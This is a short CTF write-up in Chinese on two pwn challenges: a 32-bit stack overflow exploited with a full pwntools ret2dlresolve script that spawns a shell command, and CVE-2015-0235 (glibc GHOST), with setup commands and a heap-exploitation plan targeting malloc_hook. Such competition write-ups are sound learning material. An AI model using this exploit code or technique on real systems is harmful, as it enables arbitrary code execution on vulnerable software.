mimic-game


    拟态题目，语言实现同一个程序，最后通过 obs 同时运行。
    Mimic32 guess 输出的时候有个栈溢出：

    程序是 32 位、RELRO 是部分保护 ret2dlsolved 利用，直接套 pwntools 生成 payload 模板：msgparser
from pwn import *
context.log_level="debug"
context.terminal = ['tmux','sp','-h']
context.binary = elf = ELF('./mimic32')
context.arch = 'i386'

p = process("./mimic32")

# gdb.attach(p,"b *0x080489A7")
# pause()

rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh -c 'cat flag'"])
rop.read(0,dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
# print (rop.dump())

payload = flat({48:raw_rop,80:dlresolve.payload})
p.sendlineafter(">> ",str(1))
p.sendafter("> ",payload)
p.interactive()

ghost


    此题是CVE-2015-0235 glibc __nss_hostname_digits_dots 堆溢出漏洞，如果输入的是数字，gethostbyname_r函数就会存在8个字节的溢出。   

    参考https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/7.1.2_glibc_2015-0235.html
    由于glibc版本是2.15的，所以我们要用patchelf工具去加载so和ld库
cd /lib64/
sudo ln -s /home/zzq/shanshi/game/2021/dianfengjike/ghost/ld.so.2 ./15_ld_.so.2
patchelf --set-interpreter /lib64/15_ld_.so.2 ./pwn
patchelf --replace-needed libc.so.6 ./libc.so.6 ./pwn
    可以通过输入直接溢出修改size。
     思路就是通过堆叠泄露libc的基地址，然后直接改fastbin的fd指针为malloc hook的地址，改malloc hook为one_gadget的地址。
